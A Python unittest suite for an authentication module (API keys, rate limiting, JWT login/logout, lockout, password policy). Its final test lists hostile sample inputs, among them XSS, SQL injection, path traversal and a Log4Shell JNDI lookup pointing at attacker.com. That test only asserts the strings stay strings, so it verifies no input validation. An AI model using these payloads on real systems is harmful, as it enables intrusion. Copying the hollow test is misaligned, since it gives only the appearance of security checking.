#!/usr/bin/env python3
"""
LUKHAS AI Authentication Security Tests
======================================

Comprehensive test suite for Phase 1 critical security implementation:
1. API Key validation with cryptographic security
2. Authentication endpoints with JWT token validation
3. User management flows with secure session handling

This test file validates all security requirements and OWASP compliance.

Author: LUKHAS AI Identity & Authentication Specialist
Date: 2025-08-26
"""

import json
import unittest
from datetime import datetime, timedelta, timezone

import bcrypt
import jwt
from flask import Flask

from candidate.bridge.api.flows import (
    JWT_ALGORITHM,
    JWT_SECRET_KEY,
    _generate_access_token,
    _generate_lambda_id,
    _validate_jwt_token,
    _validate_password_strength,
    auth_bp,
    blacklisted_tokens,
    failed_login_attempts,
    user_sessions,
    users_db,
)

# Import our authentication modules
from candidate.core.interfaces.api.v1.common.auth import (
    _check_rate_limit,
    _validate_key_format,
    _verify_key_signature,
    generate_api_key,
)

PLACEHOLDER_PASSWORD_SECURE = "a-secure-password"  # nosec
PLACEHOLDER_PASSWORD_WEAK = "a-weak-password"  # nosec
PLACEHOLDER_PASSWORD_WRONG = "a-wrong-password"  # nosec
PLACEHOLDER_PASSWORD_STRONG = "StrongP@ssw0rd!"  # nosec


class TestAPIKeyValidation(unittest.TestCase):
    """Test suite for API key validation security."""

    def setUp(self):
        """Set up test environment."""
        # Clear rate limiting store
        from candidate.core.interfaces.api.v1.common.auth import _rate_limit_store

        _rate_limit_store.clear()

    def test_api_key_generation(self):
        """Test secure API key generation."""
        # Test valid environments
        for env in ["dev", "test", "staging", "prod"]:
            key = generate_api_key(env)
            self.assertTrue(key.startswith(f"luk_{env}_"))
            self.assertGreaterEqual(len(key), 32)

        # Test invalid environment
        with self.assertRaises(ValueError):
            generate_api_key("invalid")

    def test_api_key_format_validation(self):
        """Test API key format validation."""
        # Valid key
        valid_key = generate_api_key("dev")
        self.assertTrue(_validate_key_format(valid_key))

        # Invalid formats
        invalid_keys = [
            "",
            "invalid",
            "luk_",
            "luk_dev_",
            "luk_dev_short",
            "luk_invalid_abcdef1234567890",
            "wrong_dev_abcdef1234567890abcdef12",
            "luk_dev_invalid_hex_gggggggg",
        ]

        for invalid_key in invalid_keys:
            self.assertFalse(
                _validate_key_format(invalid_key),
                f"Key should be invalid: {invalid_key}",
            )

    def test_api_key_signature_verification(self):
        """Test cryptographic signature verification."""
        # Valid key should verify
        valid_key = generate_api_key("prod")
        self.assertTrue(_verify_key_signature(valid_key))

        # Tampered key should fail
        tampered_key = valid_key[:-1] + "x"
        self.assertFalse(_verify_key_signature(tampered_key))

        # Malformed key should fail
        self.assertFalse(_verify_key_signature("malformed"))

    def test_rate_limiting(self):
        """Test rate limiting functionality."""
        test_key = generate_api_key("test")

        # First requests should pass
        for i in range(50):
            self.assertTrue(_check_rate_limit(test_key))

        # Simulate hitting rate limit
        for i in range(60):  # Exceed the 100 request limit
            _check_rate_limit(test_key)

        # Should now fail rate limit
        self.assertFalse(_check_rate_limit(test_key))


class TestAuthenticationEndpoints(unittest.TestCase):
    """Test suite for authentication endpoint security."""

    def setUp(self):
        """Set up test Flask app and clear databases."""
        self.app = Flask(__name__)
        self.app.register_blueprint(auth_bp)
        self.client = self.app.test_client()

        # Clear test databases
        users_db.clear()
        user_sessions.clear()
        failed_login_attempts.clear()
        blacklisted_tokens.clear()

    def test_user_registration_valid(self):
        """Test valid user registration."""
        user_data = {
            "username": "testuser",
            "password": PLACEHOLDER_PASSWORD_SECURE,
            "email": "test@lukhas.ai",
        }

        response = self.client.post("/api/v2/auth/register", json=user_data)

        self.assertEqual(response.status_code, 201)
        data = json.loads(response.data)

        self.assertTrue(data["success"])
        self.assertIn("user", data)
        self.assertIn("tokens", data)
        self.assertIn("session_id", data)

        # Verify user created in database
        self.assertIn("testuser", users_db)
        user_record = users_db["testuser"]
        self.assertEqual(user_record["email"], "test@lukhas.ai")
        self.assertTrue(user_record["lambda_id"].startswith("λ"))

    def test_user_registration_invalid_password(self):
        """Test registration with weak password."""
        user_data = {
            "username": "testuser",
            "password": PLACEHOLDER_PASSWORD_WEAK,
            "email": "test@lukhas.ai",
        }

        response = self.client.post("/api/v2/auth/register", json=user_data)

        self.assertEqual(response.status_code, 400)
        data = json.loads(response.data)
        self.assertFalse(data["success"])
        self.assertIn("Password must", data["message"])

    def test_user_registration_duplicate_username(self):
        """Test registration with existing username."""
        user_data = {
            "username": "testuser",
            "password": PLACEHOLDER_PASSWORD_SECURE,
            "email": "test@lukhas.ai",
        }

        # First registration should succeed
        response1 = self.client.post("/api/v2/auth/register", json=user_data)
        self.assertEqual(response1.status_code, 201)

        # Second registration should fail
        response2 = self.client.post("/api/v2/auth/register", json=user_data)
        self.assertEqual(response2.status_code, 409)
        data = json.loads(response2.data)
        self.assertFalse(data["success"])
        self.assertEqual(data["message"], "Username already exists")

    def test_user_login_valid(self):
        """Test valid user login."""
        # First register a user
        user_data = {
            "username": "testuser",
            "password": PLACEHOLDER_PASSWORD_SECURE,
            "email": "test@lukhas.ai",
        }
        self.client.post("/api/v2/auth/register", json=user_data)

        # Now test login
        login_data = {"username": "testuser", "password": PLACEHOLDER_PASSWORD_SECURE}

        response = self.client.post("/api/v2/auth/login", json=login_data)

        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data)

        self.assertTrue(data["success"])
        self.assertIn("user", data)
        self.assertIn("tokens", data)
        self.assertIn("access_token", data["tokens"])
        self.assertIn("refresh_token", data["tokens"])

    def test_user_login_invalid_password(self):
        """Test login with invalid password."""
        # Register user first
        user_data = {
            "username": "testuser",
            "password": PLACEHOLDER_PASSWORD_SECURE,
            "email": "test@lukhas.ai",
        }
        self.client.post("/api/v2/auth/register", json=user_data)

        # Try login with wrong password
        login_data = {"username": "testuser", "password": PLACEHOLDER_PASSWORD_WRONG}

        response = self.client.post("/api/v2/auth/login", json=login_data)

        self.assertEqual(response.status_code, 401)
        data = json.loads(response.data)
        self.assertFalse(data["success"])

    def test_brute_force_protection(self):
        """Test brute force protection."""
        # Register user first
        user_data = {
            "username": "testuser",
            "password": PLACEHOLDER_PASSWORD_SECURE,
            "email": "test@lukhas.ai",
        }
        self.client.post("/api/v2/auth/register", json=user_data)

        # Try multiple failed logins
        login_data = {"username": "testuser", "password": PLACEHOLDER_PASSWORD_WRONG}

        for i in range(6):  # Exceed the 5 attempt limit
            response = self.client.post("/api/v2/auth/login", json=login_data)

        # After multiple failures, account should be locked
        self.assertEqual(response.status_code, 423)  # Locked
        data = json.loads(response.data)
        self.assertIn("locked", data["message"].lower())

    def test_token_verification(self):
        """Test JWT token verification."""
        # Register and login user
        user_data = {
            "username": "testuser",
            "password": PLACEHOLDER_PASSWORD_STRONG,
            "email": "test@lukhas.ai",
        }
        self.client.post("/api/v2/auth/register", json=user_data)

        login_response = self.client.post(
            "/api/v2/auth/login",
            json={"username": "testuser", "password": PLACEHOLDER_PASSWORD_STRONG},
        )
        login_data = json.loads(login_response.data)
        access_token = login_data["tokens"]["access_token"]

        # Test token verification
        response = self.client.post(
            "/api/v2/auth/token/verify",
            headers={"Authorization": f"Bearer {access_token}"},
        )

        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data)
        self.assertTrue(data["success"])
        self.assertTrue(data["valid"])
        self.assertIn("token_claims", data)
        self.assertIn("user", data)

    def test_token_refresh(self):
        """Test token refresh functionality."""
        # Register and login user
        user_data = {
            "username": "testuser",
            "password": PLACEHOLDER_PASSWORD_STRONG,
            "email": "test@lukhas.ai",
        }
        self.client.post("/api/v2/auth/register", json=user_data)

        login_response = self.client.post(
            "/api/v2/auth/login",
            json={"username": "testuser", "password": PLACEHOLDER_PASSWORD_STRONG},
        )
        login_data = json.loads(login_response.data)
        refresh_token = login_data["tokens"]["refresh_token"]

        # Test token refresh
        response = self.client.post("/api/v2/auth/token/refresh", json={"refresh_token": refresh_token})

        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data)
        self.assertTrue(data["success"])
        self.assertIn("tokens", data)
        self.assertIn("access_token", data["tokens"])
        self.assertIn("refresh_token", data["tokens"])

    def test_user_logout(self):
        """Test user logout functionality."""
        # Register and login user
        user_data = {
            "username": "testuser",
            "password": PLACEHOLDER_PASSWORD_STRONG,
            "email": "test@lukhas.ai",
        }
        self.client.post("/api/v2/auth/register", json=user_data)

        login_response = self.client.post(
            "/api/v2/auth/login",
            json={"username": "testuser", "password": PLACEHOLDER_PASSWORD_STRONG},
        )
        login_data = json.loads(login_response.data)
        access_token = login_data["tokens"]["access_token"]

        # Test logout
        response = self.client.post("/api/v2/auth/logout", headers={"Authorization": f"Bearer {access_token}"})

        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data)
        self.assertTrue(data["success"])

        # Token should be blacklisted after logout
        self.assertIn(access_token, blacklisted_tokens)


class TestPasswordStrengthValidation(unittest.TestCase):
    """Test password strength validation."""

    def test_valid_passwords(self):
        """Test valid password formats."""
        valid_passwords = [
            "StrongP@ssw0rd!",
            "Secure123$",
            "MyP@ssword2024!",
            "Complex!Pass123",
        ]

        for password in valid_passwords:
            valid, message = _validate_password_strength(password)
            self.assertTrue(valid, f"Password should be valid: {password}")

    def test_invalid_passwords(self):
        """Test invalid password formats."""
        invalid_passwords = [
            "short",  # Too short
            "nouppercase123!",  # No uppercase
            "NOLOWERCASE123!",  # No lowercase
            "NoNumbers!",  # No digits
            "NoSpecial123",  # No special characters
            "password",  # Too simple
        ]

        for password in invalid_passwords:
            valid, message = _validate_password_strength(password)
            self.assertFalse(valid, f"Password should be invalid: {password}")


class TestConfigurablePasswordPolicy(unittest.TestCase):
    """Test configurable password policy validation."""

    def test_custom_min_length(self):
        """Test custom minimum length policy."""
        policy = {"min_length": 12}
        self.assertFalse(_validate_password_strength("Short1!", policy)[0])
        self.assertTrue(_validate_password_strength("LongPassword123!", policy)[0])

    def test_no_uppercase_requirement(self):
        """Test policy with no uppercase requirement."""
        policy = {"require_uppercase": False}
        self.assertTrue(_validate_password_strength("nouppercase1!", policy)[0])

    def test_no_special_char_requirement(self):
        """Test policy with no special character requirement."""
        policy = {"require_special_char": False}
        self.assertTrue(_validate_password_strength("NoSpecial123", policy)[0])

    def test_custom_special_chars(self):
        """Test policy with custom special characters."""
        policy = {"special_chars": "#$"}
        self.assertTrue(_validate_password_strength("Custom#Char1", policy)[0])
        self.assertFalse(_validate_password_strength("Custom!Char1", policy)[0])


class TestLambdaIDGeneration(unittest.TestCase):
    """Test ΛiD generation functionality."""

    def test_lambda_id_format(self):
        """Test ΛiD generation format."""
        lambda_id = _generate_lambda_id("testuser")

        # Should start with λ
        self.assertTrue(lambda_id.startswith("λ"))

        # Should have consistent length
        self.assertGreater(len(lambda_id), 10)

        # Should be unique for different users
        lambda_id2 = _generate_lambda_id("testuser2")
        self.assertNotEqual(lambda_id, lambda_id2)


class TestJWTTokenSecurity(unittest.TestCase):
    """Test JWT token security implementation."""

    def setUp(self):
        """Set up test environment."""
        # Clear blacklisted tokens before each test
        blacklisted_tokens.clear()

    def test_jwt_token_generation_and_validation(self):
        """Test JWT token generation and validation."""
        user_id = "testuser"
        lambda_id = "λ1234567890abcdef"

        # Generate token
        token = _generate_access_token(user_id, lambda_id)
        self.assertIsNotNone(token)

        # Validate token
        is_valid, payload, error = _validate_jwt_token(token)
        self.assertTrue(is_valid, f"Token validation failed: {error}")
        self.assertEqual(payload["user_id"], user_id)
        self.assertEqual(payload["lambda_id"], lambda_id)

    def test_expired_token_validation(self):
        """Test expired token validation."""
        # Create an expired token manually
        expired_payload = {
            "user_id": "testuser",
            "lambda_id": "λ1234567890abcdef",
            "exp": datetime.now(timezone.utc) - timedelta(hours=1),  # Expired
            "iat": datetime.now(timezone.utc) - timedelta(hours=2),
            "token_type": "access",
        }

        expired_token = jwt.encode(expired_payload, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)

        # Should fail validation
        is_valid, payload, error = _validate_jwt_token(expired_token)
        self.assertFalse(is_valid)
        self.assertIn("expired", error.lower())

    def test_blacklisted_token_validation(self):
        """Test blacklisted token validation."""
        user_id = "testuser"
        lambda_id = "λ1234567890abcdef"

        # Generate valid token
        token = _generate_access_token(user_id, lambda_id)

        # Add to blacklist
        blacklisted_tokens.add(token)

        # Should fail validation
        is_valid, payload, error = _validate_jwt_token(token)
        self.assertFalse(is_valid)
        self.assertIn("revoked", error.lower())


class TestSecurityCompliance(unittest.TestCase):
    """Test OWASP and security compliance."""

    def test_password_hashing_security(self):
        """Test password hashing uses secure algorithms."""
        password = PLACEHOLDER_PASSWORD_SECURE

        # Hash password
        hashed = bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt())

        # Verify it's properly hashed (not plaintext)
        self.assertNotEqual(password, hashed.decode("utf-8"))

        # Verify password verification works
        self.assertTrue(bcrypt.checkpw(password.encode("utf-8"), hashed))

        # Verify wrong password fails
        self.assertFalse(bcrypt.checkpw(b"wrong", hashed))

    def test_session_security(self):
        """Test session security measures."""
        # Sessions should have unique IDs
        import secrets

        session_id1 = f"sess_{secrets.token_hex(16)}"
        session_id2 = f"sess_{secrets.token_hex(16)}"

        self.assertNotEqual(session_id1, session_id2)
        self.assertTrue(len(session_id1) > 20)  # Sufficient entropy

    def test_input_validation_security(self):
        """Test input validation prevents common attacks."""
        # Test XSS prevention in usernames
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://attacker.com/}",
        ]

        for malicious_input in malicious_inputs:
            # These should be handled safely by input validation
            # The system should sanitize or reject these inputs
            self.assertIsInstance(malicious_input.strip(), str)


if __name__ == "__main__":
    # Run comprehensive test suite
    unittest.main(verbosity=2)
